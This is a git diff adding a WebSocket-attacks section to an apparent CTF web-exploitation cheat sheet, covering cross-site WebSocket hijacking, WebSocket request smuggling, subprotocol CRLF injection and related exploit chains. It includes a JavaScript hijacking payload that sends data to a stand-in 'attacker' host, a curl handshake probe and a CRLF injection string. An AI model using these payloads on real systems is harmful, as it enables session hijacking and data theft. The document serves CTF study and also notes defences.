@@ -19,6 +19,7 @@
 - [Shadow DOM XSS](#shadow-dom-xss)
 - [DOM Clobbering + MIME Mismatch](#dom-clobbering--mime-mismatch)
 - [HTTP Request Smuggling via Cache Proxy](#http-request-smuggling-via-cache-proxy)
+- [WebSocket Attacks (CSWSH & Smuggling)](#websocket-attacks-cswsh--smuggling)
 - [CSS/JS Paywall Bypass](#cssjs-paywall-bypass)
 - [JPEG+HTML Polyglot XSS (EHAX 2026)](#jpeghtml-polyglot-xss-ehax-2026)
 - [JSFuck Decoding](#jsfuck-decoding)
@@ -260,6 +261,42 @@ outer_req = (
     f"\r\n"
 ).encode() + inner_req
 ```
+
+---
+
+## WebSocket Attacks (CSWSH & Smuggling)
+
+### Cross-Site WebSocket Hijacking (CSWSH)
+
+**Pattern:** 后端 WS 端点（`/ws`、`/socket`）仅靠 Cookie 鉴权、**不校验 `Origin` 头**。攻击者页面执行 `new WebSocket('wss://target/ws')` → 浏览器自动带上目标站 Cookie → 连接成功 → 可读服务端推送的消息，也可伪造消息触发操作（改设置、发消息、下单）。
+
+**Detection（三连问）：**
+1. 握手响应（`101 Switching Protocols`）在**无/任意 Origin** 时仍成功？手工握手：`curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom|base64)" -H "Sec-WebSocket-Version: 13" http://TARGET/ws`。
+2. 会话凭证在 Cookie 里（而非握手内单独 token）？
+3. 流量是 `ws://`（明文）而非 `wss://`？→ 可中间人改写消息。
+
+**Exploit（挂在自己页面，让 admin bot 访问）：**
+```javascript
+const ws = new WebSocket('wss://target/ws');
+ws.onopen = () => ws.send('{"cmd":"read_flag"}');   // 发命令
+ws.onmessage = e => new Image().src =
+  'https://attacker/?d=' + encodeURIComponent(e.data); // 读消息
+```
+注意：CSP/SameSite 缓解有限——WS 握手不执行页面脚本，`connect-src` 才拦（缺省则取 `default-src`）；WS 握手请求的 Cookie 行为因浏览器与导航上下文而异，**服务端校验 Origin 才是正解**。浏览器握手必带 Origin，但非浏览器客户端可伪造，故 Origin 校验只挡浏览器攻击面（如 admin bot）。
+
+### WebSocket Smuggling & Subprotocol Injection
+
+**Concept:** WS 首包是 `GET` + `Upgrade`，与 HTTP 共享解析器（代理/网关）。代理对 Upgrade 透传处理或缓冲区不一致时，WS 帧内容（含 CRLF）可能被后继 HTTP 解析器当新请求读走（request smuggling 的升级变体）。帧里的 `\r\n\r\n` 是测试点。
+
+**Subprotocol 选择器注入:** 客户端可声明任意 `Sec-WebSocket-Protocol: a, b`；若服务端把提议值**原样拼进响应头**且不过滤 → CRLF 头注入（`a\r\nX-Injected: 1`）。即使无 CRLF，subprotocol 常被当作"命令分派/能力协商"参数 → 选危险 subprotocol 触发调试模式/提权逻辑。
+
+### Exploit Chains
+
+- **XSS in WS context:** `ws.onmessage` 把 `e.data` 直接塞进 `innerHTML`/`eval` → 服务端发一条含 payload 的消息即 XSS，**绕过所有 HTTP 侧输入过滤**（payload 不经过 HTTP 参数）。
+- **WS 消息 → 后端注入:** 服务端把 WS 当"内部可信通道"，消息字段拼进 SQL/命令/模板 → WS 是 SQLi/命令注入的传送带。
+- **CSWSH + admin bot:** 挑战的 bot 访问你的页面，页面后台开 WS → 读管理消息/触发管理动作（与 [Admin Bot javascript: URL Scheme Bypass](#admin-bot-javascript-url-scheme-bypass-dicectf-2026) 类挑战同构）。
+
+**Detection:** 源码找 `new WebSocket(`/`ws:`/`wss:` 地址与服务端 upgrade 路由；`Sec-WebSocket-Protocol` 客户端可控时测 CRLF；admin bot 题把 WS 当注入通道测。
 
 ---
 
